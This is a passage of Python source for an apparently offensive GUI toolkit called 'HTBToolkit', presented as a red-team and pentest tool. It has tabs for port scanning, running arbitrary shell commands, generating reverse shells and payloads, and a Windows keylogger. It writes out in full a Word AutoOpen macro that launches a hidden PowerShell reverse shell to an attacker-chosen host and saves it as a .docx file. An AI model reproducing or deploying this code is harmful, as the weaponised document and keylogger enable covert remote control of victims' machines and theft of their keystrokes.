        """Create keylogger tab (Windows only)"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Keylogger")
        
        # Log file selection
        log_frame = ttk.Frame(tab)
        log_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(log_frame, text="Log File:").pack(side=tk.LEFT, padx=5)
        self.keylog_file = ttk.Entry(log_frame)
        self.keylog_file.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.keylog_file.insert(0, "keylog.txt")
        
        # Buttons
        btn_frame = ttk.Frame(tab)
        btn_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(
            btn_frame, 
            text="Start Keylogger", 
            command=self.start_keylogger
        ).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(
            btn_frame, 
            text="Stop Keylogger", 
            command=self.stop_keylogger
        ).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(
            btn_frame, 
            text="View Log", 
            command=self.view_keylog
        ).pack(side=tk.LEFT, padx=5)
        
        # Status
        self.keylog_status = ttk.Label(tab, text="Status: Not running")
        self.keylog_status.pack(padx=5, pady=5)
        
        # Log viewer
        self.keylog_viewer = scrolledtext.ScrolledText(
            tab, 
            height=15,
            bg=self.THEMES[self.current_theme]["text_bg"],
            fg=self.THEMES[self.current_theme]["text_fg"],
            insertbackground=self.THEMES[self.current_theme]["fg"]
        )
        self.keylog_viewer.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    def create_settings_tab(self):
        """Create settings tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Settings")
        
        # Theme selection
        theme_frame = ttk.Frame(tab)
        theme_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(theme_frame, text="Theme:").pack(side=tk.LEFT, padx=5)
        self.theme_var = tk.StringVar(value=self.current_theme)
        
        for theme in self.THEMES:
            ttk.Radiobutton(
                theme_frame, 
                text=theme, 
                variable=self.theme_var, 
                value=theme,
                command=self.change_theme
            ).pack(side=tk.LEFT, padx=5)
        
        # API keys
        api_frame = ttk.LabelFrame(tab, text="API Keys")
        api_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(api_frame, text="VirusTotal:").pack(side=tk.LEFT, padx=5)
        self.vt_key = ttk.Entry(api_frame)
        self.vt_key.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        ttk.Label(api_frame, text="Shodan:").pack(side=tk.LEFT, padx=5)
        self.shodan_key = ttk.Entry(api_frame)
        self.shodan_key.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Save button
        ttk.Button(
            tab, 
            text="Save Settings", 
            command=self.save_settings
        ).pack(padx=5, pady=10)
    
    # ======================
    # Core Functionality
    # ======================
    
    def execute_command(self, command=None):
        """Execute system command"""
        if command is None:
            command = self.cmd_entry.get()
        
        if not command:
            return
        
        self.shell_output.delete(1.0, tk.END)
        self.shell_output.insert(tk.END, f"> {command}\n")
        
        try:
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True
            )
            output = result.stdout + result.stderr
            self.shell_output.insert(tk.END, output)
        except Exception as e:
            self.shell_output.insert(tk.END, f"Error: {str(e)}")
    
    def run_port_scan(self):
        """Run port scan on target"""
        target = self.scan_target.get()
        ports = self.parse_port_range(self.port_range.get())
        
        if not target or not ports:
            messagebox.showerror("Error", "Please enter target and port range")
            return
        
        self.scan_results.delete(1.0, tk.END)
        self.scan_results.insert(tk.END, f"Scanning {target}...\n")
        
        def scan_thread():
            open_ports = Scanner.port_scan(target, ports)
            self.scan_results.insert(tk.END, f"Open ports: {', '.join(map(str, open_ports))}")
        
        threading.Thread(target=scan_thread, daemon=True).start()
    
    def run_ping_sweep(self):
        """Run ping sweep on network"""
        target = self.scan_target.get()
        
        if not target:
            messagebox.showerror("Error", "Please enter target network")
            return
        
        # Extract network prefix (e.g., 192.168.1 from 192.168.1.1)
        network = '.'.join(target.split('.')[:3])
        
        self.scan_results.delete(1.0, tk.END)
        self.scan_results.insert(tk.END, f"Scanning {network}.0/24...\n")
        
        def ping_thread():
            alive_hosts = Scanner.ping_sweep(network)
            self.scan_results.insert(tk.END, f"Active hosts: {', '.join(alive_hosts)}")
        
        threading.Thread(target=ping_thread, daemon=True).start()
    
    def generate_exploit(self):
        """Generate exploit code"""
        exploit_type = self.exploit_type.get()
        lhost = self.lhost_entry.get()
        lport = self.lport_entry.get()
        
        if not lhost or not lport:
            messagebox.showerror("Error", "Please enter LHOST and LPORT")
            return
        
        self.exploit_output.delete(1.0, tk.END)
        
        if exploit_type == "Reverse Shell":
            shells = {
                "Bash": ExploitGenerator.generate_reverse_shell(lhost, lport, 'bash'),
                "Python": ExploitGenerator.generate_reverse_shell(lhost, lport, 'python'),
                "PowerShell": ExploitGenerator.generate_reverse_shell(lhost, lport, 'powershell'),
                "PHP": ExploitGenerator.generate_reverse_shell(lhost, lport, 'php')
            }
            
            for name, code in shells.items():
                self.exploit_output.insert(tk.END, f"=== {name} ===\n{code}\n\n")
        elif exploit_type == "File Upload":
            self.exploit_output.insert(tk.END, "File upload exploit templates coming soon!")
        else:
            self.exploit_output.insert(tk.END, "Privilege escalation techniques coming soon!")
    
    def generate_payload(self):
        """Generate payload"""
        payload_type = self.payload_type.get()
        lhost = self.payload_lhost.get()
        lport = self.payload_lport.get()
        
        if not lhost or not lport:
            messagebox.showerror("Error", "Please enter LHOST and LPORT")
            return
        
        self.payload_output.delete(1.0, tk.END)
        
        if payload_type == "HTA":
            payload = ExploitGenerator.generate_hta_payload(lhost, lport)
            self.payload_output.insert(tk.END, payload)
        elif payload_type == "PowerShell":
            payload = ExploitGenerator.generate_reverse_shell(lhost, lport, 'powershell')
            self.payload_output.insert(tk.END, payload)
        elif payload_type == "Python":
            payload = ExploitGenerator.generate_reverse_shell(lhost, lport, 'python')
            self.payload_output.insert(tk.END, payload)
        elif payload_type == "Bash":
            payload = ExploitGenerator.generate_reverse_shell(lhost, lport, 'bash')
            self.payload_output.insert(tk.END, payload)
        elif payload_type == "DOCX Macro":
            macro_code = f"""
            Sub AutoOpen()
                Dim cmd As String
                cmd = "powershell -nop -w hidden -c \"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"""
                Shell cmd, vbHide
            End Sub
            """
            payload = ExploitGenerator.generate_malicious_docx(macro_code)
            self.payload_output.insert(tk.END, payload)
    
    def save_payload(self):
        """Save payload to file"""
        payload = self.payload_output.get(1.0, tk.END)
        if not payload.strip():
            messagebox.showerror("Error", "No payload to save")
            return
        
        filetypes = {
            "HTA": [("HTA Files", "*.hta")],
            "PowerShell": [("PowerShell Scripts", "*.ps1")],
            "Python": [("Python Files", "*.py")],
            "Bash": [("Shell Scripts", "*.sh")],
            "DOCX Macro": [("Word Documents", "*.docx")]
        }
        
        payload_type = self.payload_type.get()
        default_ext = {
            "HTA": ".hta",
            "PowerShell": ".ps1",
            "Python": ".py",
            "Bash": ".sh",
            "DOCX Macro": ".docx"
        }.get(payload_type, ".txt")
        
        filename = filedialog.asksaveasfilename(
            defaultextension=default_ext,
            filetypes=filetypes.get(payload_type, [("All Files", "*.*")]))
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write(payload)
                messagebox.showinfo("Success", f"Payload saved to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save file: {str(e)}")
    
    def scan_web(self):
        """Scan web application for vulnerabilities"""
        url = self.web_url.get()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        self.web_results.delete(1.0, tk.END)
        self.web_results.insert(tk.END, f"Scanning {url}...\n")
        
        def scan_thread():
            try:
                results = Scanner.web_vuln_scan(url)
                self.web_results.insert(tk.END, "\n=== Results ===\n")
                for vuln, status in results.items():
                    self.web_results.insert(tk.END, f"{vuln}: {status}\n")
            except Exception as e:
                self.web_results.insert(tk.END, f"Scan failed: {str(e)}")
        
        threading.Thread(target=scan_thread, daemon=True).start()
    
    def analyze_with_ai(self):
        """Analyze input with AI"""
        input_text = self.ai_input.get(1.0, tk.END)
        if not input_text.strip():
            messagebox.showerror("Error", "Please enter text to analyze")
            return
        
        api_key = self.ai_key.get()
        if not api_key:
            messagebox.showerror("Error", "Please enter OpenAI API key")
            return
        
        self.ai_output.delete(1.0, tk.END)
        self.ai_output.insert(tk.END, "Analyzing...\n")
        
        def ai_thread():
            self.ai_assistant.api_key = api_key
            result = self.ai_assistant.analyze_logs(input_text)
            self.ai_output.insert(tk.END, "\n=== Analysis ===\n")
            self.ai_output.insert(tk.END, result)
        
        threading.Thread(target=ai_thread, daemon=True).start()
    
    def start_keylogger(self):
        """Start keylogger"""
        if not hasattr(self, 'keylogger'):
            log_file = self.keylog_file.get()
            self.keylogger = Keylogger(log_file)
        
        result = self.keylogger.start()
        self.keylog_status.config(text="Status: Running")
        messagebox.showinfo("Keylogger", result)
    
    def stop_keylogger(self):
        """Stop keylogger"""
        if not hasattr(self, 'keylogger'):
            messagebox.showerror("Error", "Keylogger not initialized")
            return
        
        result = self.keylogger.stop()
        self.keylog_status.config(text="Status: Stopped")
        messagebox.showinfo("Keylogger", result)
    
    def view_keylog(self):
        """View keylog file"""
        if not hasattr(self, 'keylogger'):
            messagebox.showerror("Error", "Keylogger not initialized")
            return
        
        try:
            with open(self.keylogger.log_file, 'r') as f:
                content = f.read()
            self.keylog_viewer.delete(1.0, tk.END)
            self.keylog_viewer.insert(tk.END, content)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to read log: {str(e)}")
    
    def parse_port_range(self, port_str):
        """Parse port range string into list of ports"""
        ports = []
        for part in port_str.split(','):
            if '-' in part:
                start, end = map(int, part.split('-'))
                ports.extend(range(start, end + 1))
            else:
                ports.append(int(part))
        return ports
    
    # ======================
    # UI Helpers
    # ======================
    
    def select_theme(self):
        """Open theme selection dialog"""
        theme = simpledialog.askstring(
            "Select Theme",
            "Available themes: " + ", ".join(self.THEMES.keys()),
            parent=self.root
        )
        
        if theme and theme in self.THEMES:
            self.current_theme = theme
            self.apply_theme()
            self.config.set("theme", theme)
    
    def change_theme(self):
        """Change application theme"""
        self.current_theme = self.theme_var.get()
        self.apply_theme()
        self.config.set("theme", self.current_theme)
    
    def save_settings(self):
        """Save application settings"""
        self.config.set("api_keys", {
            "virustotal": self.vt_key.get(),
            "shodan": self.shodan_key.get()
        })
        messagebox.showinfo("Settings", "Settings saved successfully")
    
    def check_updates(self):
        """Check for updates"""
        messagebox.showinfo("Update Check", "This feature is coming soon!")
    
    def show_docs(self):
        """Show documentation"""
        webbrowser.open("https://github.com/htbtoolkit/docs")
    
    def show_about(self):
        """Show about dialog"""
        about_text = """HTBToolkit v4.0
    Ultimate Red Team & Pentest Toolkit

    Features:
    - Network scanning
    - Exploit development
    - Payload generation
    - AI-assisted analysis
    - Keylogger (Windows)
    - And much more!

    License: MIT"""
        messagebox.showinfo("About HTBToolkit", about_text)

# Main execution
if __name__ == "__main__":
    root = tk.Tk()
    app = HTBToolkitGUI(root)
    root.mainloop()